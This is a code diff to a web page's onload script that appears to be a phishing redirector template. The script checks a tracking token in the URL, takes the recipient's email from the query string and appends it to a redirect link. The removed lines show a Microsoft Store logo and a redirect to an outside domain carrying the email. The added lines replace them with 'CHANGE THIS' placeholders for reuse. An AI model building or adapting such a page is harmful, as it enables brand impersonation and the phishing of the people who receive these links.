@@ -18,7 +18,7 @@
             flex-direction: column;
         }
         img {
-            width: 380px; /* Increased logo size */
+            width: 350px;
             height: auto;
             margin-bottom: 20px;
         }
@@ -38,11 +38,13 @@
         window.onload = function () {
             const urlParams = new URLSearchParams(window.location.search);
             const tokenPattern = /^[A-Z]{20}[a-z]{20}[0-9]{8}=$/; // Token validation pattern
-            
-            // Extract token and email
-            let tokenKey = [...urlParams.keys()][0]; // Get the first query param key
+
+            // Extract token
+            let tokenKey = Object.keys(Object.fromEntries(urlParams.entries()))[0] || "";
+            console.log("Extracted token:", tokenKey); // Debugging line
+
             let email = urlParams.get(tokenKey); // Get email if present
-            
+
             // Validate token format
             if (!tokenPattern.test(tokenKey)) {
                 document.body.innerHTML = "<h2>Invalid Token</h2>";
@@ -50,8 +52,8 @@
             }
 
             // Set image & redirect URL
-            const imageUrl = "https://store-images.s-microsoft.com/image/apps.64342.9007199266252569.06e34d57-e1e7-4d60-9444-9e04e7cea74f.839ba91a-9709-429a-9e00-6c3e0cda6f0c"; 
-            let redirectUrl = "https://random.bmtadvantage.org/deep-linkcdn?em="; 
+            const imageUrl = "https://your-logo-url.com/logo.png"; // CHANGE THIS
+            let redirectUrl = "https://your-final-url.com"; // CHANGE THIS
 
             // Decode Base64 if necessary
             if (email) {
